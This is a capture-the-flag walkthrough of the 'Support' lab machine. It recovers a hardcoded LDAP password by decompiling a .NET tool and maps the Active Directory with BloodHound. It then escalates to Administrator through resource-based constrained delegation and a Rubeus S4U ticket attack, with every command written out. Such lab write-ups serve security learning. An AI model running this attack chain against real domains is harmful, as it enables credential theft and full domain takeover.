 #decompile #ILSpy #AD #BloodHound #kerberos #rubeus #GenericAll #RBCD

Support is an easy box which contains an interesting vector to gain a foothold and an early AD enumeration to get to the domain administrator. In the first step we find out an accessible SMB Share which contains different tools. One of them doesn't seem to be a recognizable one, thus we download it and discover that by decompiling the executable a cleartext password is found, leading us to gain a foothold on the machine as the user `support.htb\ldap`. Once gained this foothold, we use SharpHound / bloodhound.py to extract the AD content of the machine, discovering an interesting relationship by using a Bloodhound pre-built search `Shortest path to systems trusted for unconstrained delegation`. We then try to find a way to gain `support.htb\support` password, discovering it in the `info` field of its LDAP. Once gained access as `support.htb\support` we achieve a privilege escalation by leveraging the `Generic All` rights that the group `Shared Support Accounts@support.htb` has on the domain controller.

## Nmap

Our Nmap scan results in the following output:

```bash
Nmap scan report for 10.129.94.209
Host is up (1.1s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-24 14:14:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-24T14:15:16
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 142.37 seconds
```

## SMB

We decide to scan SMB, since it seems the most interesting vector of the available one in order to look for some sensitive data in it within a null session 

```bash
smbclient -N -L //10.129.2.215
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.2.215 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We'll be able to access only NETLOGON, SYSVOL and support-tools as `Null session`.
While NETLOGON and SYSVOL are empty, support-tools provides us with some content, feels like executables and archives of executables accessible on the SMB Share.

```bash
smb: \> dir
  .                                   D        0  Wed Jul 20 17:01:06 2022
  ..                                  D        0  Sat May 28 11:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 11:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 11:19:55 2022
  putty.exe                           A  1273576  Sat May 28 11:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 11:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 17:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 11:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 11:19:43 2022
```

Between all of them, one results uncommon; its name is `UserInfo.exe`. 
We decide to download it with `get UserInfo.exe.zip` and we then unzip it with `unzip UserInfo.exe.zip`.

### Decompiling UserInfo.exe

Due to its uncommonness we decide to understand what's inside that project by decompiling it. We decompile it within the auxiliary of [ILSpy](https://github.com/icsharpcode/ILSpy). Precisely, since we're on Linux we're gonna use a port in Linux called [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy). 
To install AvaloniaILSpy, we can follow the guidelines mentioned [here](https://github.com/icsharpcode/AvaloniaILSpy?tab=readme-ov-file#build-from-sources) and then head to the folder `/AvaloniaILSpy/ILSpy/bin/Release/net6.0/linux-x64` and run `./ILSpy`.

>Since this software has a GUI, we either need to have a connection in VNC / RDP to the machine or have a DISPLAY set up

Once opened ILSpy, we can Open the content of the folder of `UserInfo` (thus all the files, DLLs and EXE) and then analyze its decompiled content

![[attachments/support-writeup-1.webp]]
By looking at its content, we understand that the tool is a tool used to query the LDAP and get some infos from it. For instance, the functions `GetUser` and `FindUser` will retrieve a given user from the LDAP by querying it.

If we lurk more in depth, we find two crucial information; the first one, the function `LDAPQuery()` tells us which user is used to query the ldap, and that user is `support\ldap` 

![[attachments/support-writeup-2.webp]]
We then understand, by looking at the `entry` variable, that the DirectoryEntry is created by using `support\ldap` and that a password is passed on that function. The password is derived by using the function `Protected.getPassword()`.
By heading on the `getPassword()` function, we discover that the password is encrypted inside this own code, thus we can try to decrypt it by reverse engineer the function.
We head up on [dotnetfiddle](https://dotnetfiddle.net/) and paste the content inside `getPassword()` and Run it. The compiler clearly tells us that some compilation error occurred, in fact we have some variables that are not referred anywhere in dotnetfiddle but are used inside of the solution within other file's declaration.

![[attachments/support-writeup-3.webp]]

By leveraging ILSpy referencing, we click on `enc_password` to be brought directly to where this variable is declared, discovering:

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
```

We then paste this inside our dotnetfiddle. We're then missing the value of `key` since dotnetfiddle is also mentioning that. 
Same process in ILSpy and we discover the following key, assumingly used for the encryption

```csharp
private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

We then cleanup dotnetfiddle since it gives us a few issues on `public` next to the function, print the value of `array2` (the decrypted password) and recall the function to properly use it, obtaining the cleartext password of the user: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` 

```csharp title:"getPassword reverse engineered"
// UserInfo.Services.Protected
using System;
using System.Text;

static string getPassword()
{
	byte[] key = Encoding.ASCII.GetBytes("armando");
	byte[] array = Convert.FromBase64String("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E");
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
	}
	Console.WriteLine(Encoding.Default.GetString(array2));
	return Encoding.Default.GetString(array2);
}

getPassword();
```

Foothold credentials: `support\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

## Enumerating the system's AD with Bloodhound

By having a foothold, we can now use the power of Bloodhound to first download all the information about the AD (with `SharpHound` or `bloodhound-python`) and then analyze them within the Bloodhound GUI. Since we're on Linux and we have no network limitation in place we opt for bloodhound-python since it's compatible with our system.

We'll get a few json files that we'll then let ingest to Bloodhound.
We open Bloodhound, in my current system I've used a containerized version of Bloodhound CE that I've hosted in the same network of my Kali machine, making it accessible from it at http://bloodhound:8080/ and we then feed it our json files from the `Administration` section within the `Upload File` option.

Once ingested, we can go back to `Explore` and start navigating the AD. After some research, on the `Cypher` page we have a list of available pre-built searches and we try some of them in order to look for some interesting findings.
With `Shortest paths to systems trusted for unconstrained delegation` we discover the presence of an anomalous connection, excluding the expected ones. Following, the anomalous path highlighted in red.

![[attachments/support-writeup-4.webp]]

The main issue here, is the fact that a group, which isn't expected to have the right, has `GenericAll` over the domain controller. Moreover, we discover that this group `Shared Support Accounts` has an user associated to it called `support`.
We have to find a way to get control over `support.htb\support` to properly gain our privilege escalation path.
By not being able to find information on that user on Bloodhound, we opt on `ldapsearch` and run the following command to extract the detailed information on the LDAP for all the OU of the target environment with ldapsearch.

Due to the amount of information and since we're exclusively looking for `support@support.htb` we print the content inside of a file called `ldap.out`.
We then open the file with vim and search (with `/`) for the string `dn: CN=support`. This will return the distinguished name for the CN (common name) `support`. 

If we carefully look at the content of the `support` user we discover, in the `info` field a string which resembles a password: `Ironside47pleasure40Watchful`
We also realize that the use belongs to a group of `Remote Management Users`, hinting at the fact that we might be able to PSRemote into it with `evil-winrm`. To confirm our thesis we try to connect with those credentials within `evil-winrm`, succeeding.

```bash
evil-winrm -i  10.129.2.215 -u support -p Ironside47pleasure40Watchful
```

## Privilege Escalation

By using the help of bloodhound, it hints us at an attack vector that could be possible if we owned an user belonging to the previously shown `Shared Support Account`. In fact, if we click on the `GenericAll` label in bloodhound, it provides us with information on how to gain SYSTEM both on Windows and on Linux. We'll try on Linux first.
### Linux

We first need to add a new computer with a SPN set, we can do so with Impacket's `addcomputer.py`

```bash
addcomputer.py -dc-ip 10.129.2.215 -computer-name test -computer-pass 'test' 'support.htb/support:Ironside47pleasure40Watchful'
```

Once the computer will be created we'll be able to assign to our fake compute a delegation to act in place of the target computer by assigning it `msDS-AllowedToActOnBehalfOfOtherIdentity`. To do so, we can use `rbcd.py` from Impacket to read or write the `rbcd` attribute ([DACL abuse](https://www.thehacker.recipes/ad/movement/dacl/)).

We can first read the attribute by doing:

```bash title:"Read the rbcd attribute"
rbcd.py -delegate-to 'support' -dc-ip dc.support.htb -action 'read' 'support.htb/support:Ironside47pleasure40Watchful'
```

And we can then write it, to delegate our attacking computer to act on behalf of the `support` one.

```bash title:"Write the rbcd attribute"
rbcd.py -delegate-from 'test$' -delegate-to 'support' -dc-ip dc.support.htb -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
```

>We got stuck here with the Linux way. Thus we're proceeding with Windows

### Windows

To perform the escalation in Windows we must first upload the needed files on the machine. For the privilege escalation we'll require: 
* PowerView
* PowerMad
* Rubeus
#### Create a new Computer Object

Within PowerMad's `New-MachineAccount` we'll be able to create a new computer and add it to the domain to then setup RBCD to it.

```powershell
Import-Module .\PowerMad.ps1
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

We'll then be able to check whether it has been created by doing: 

```powershell
Get-ADComputer -identity FAKE-COMP01
```

#### Configuring RBCD

The escalation is performed by configuring the `msds-allowedtoactonbehalfofotheridentity` attribute or by using `PrincipalsAllowedToDelegateToAccount` and set it to our fake computer object
The easier one is the latter, so we're gonna proceed with it:

```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

To check it has worked we can:

```powershell
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```

We can also check that the value of `msds-allowedtoactonbehalfofotheridentity` is properly set by doing

```powershell
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity # Due to its type of Raw Security Descriptor we can't properly understand its value, so we're going to convert the bytes onto a string
$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity # dumping the value we want to see onto a RawBytes variable
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0 # Converting the bytes to a Raw Security Descriptor object
$Descriptor # Now we're able to access the object
$Descriptor.DiscretionaryAcl # and its properties
```

#### Performing S4U Attack

The S4U attack permits us to obtain a Kerberos ticket on behalf of the Administrator, we'll user Rubeus for it.
We first require the hash of the password created within the fake computer object

```powershell
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```

and we'll have to grab the `rc4_hmac` from its output, that we'll then inject in our Kerberos ticket generation command for the Administrator user

```powershell
rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

### Converting the ticket and getting a shell as Administrator

Once obtained the ticket within Rubeus, we can copy it on a file called `ticket.kirbi.b64`. 

>It's important to remove the spaces from the file, it can be done by doing `:%s/ //g` with vim

Once removed the spaces we can convert the file from b64 to plain text by doing: `base64 -d ticket.kirbi.b64 > ticket.kirbi`

We can then use `ticketConverter.py` from Impacket to convert the ticket into a `ccache` ticket, which is the format for Kerberos tickets in Linux by doing: `ticketConverter.py ticket.kirbi ticket.ccache`
Finally, we can get a shell within `psexec.py` by passing the ticket to the python script:

```bash
KRB5CCNAME=ticket.ccache psexec.py -k -no-pass support.htb/administrator@dc.support.htb
```

